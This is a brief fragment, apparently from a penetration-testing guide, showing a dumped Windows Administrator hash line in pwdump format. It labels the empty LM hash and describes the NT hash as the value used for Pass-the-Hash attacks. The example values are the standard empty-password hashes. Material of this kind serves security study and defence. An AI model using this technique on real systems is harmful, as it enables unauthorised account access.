Example: Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

LM Hash (empty): aad3b435b51404eeaad3b435b51404ee
NT Hash: The actual password hash to use for Pass-the-Hash
```

***

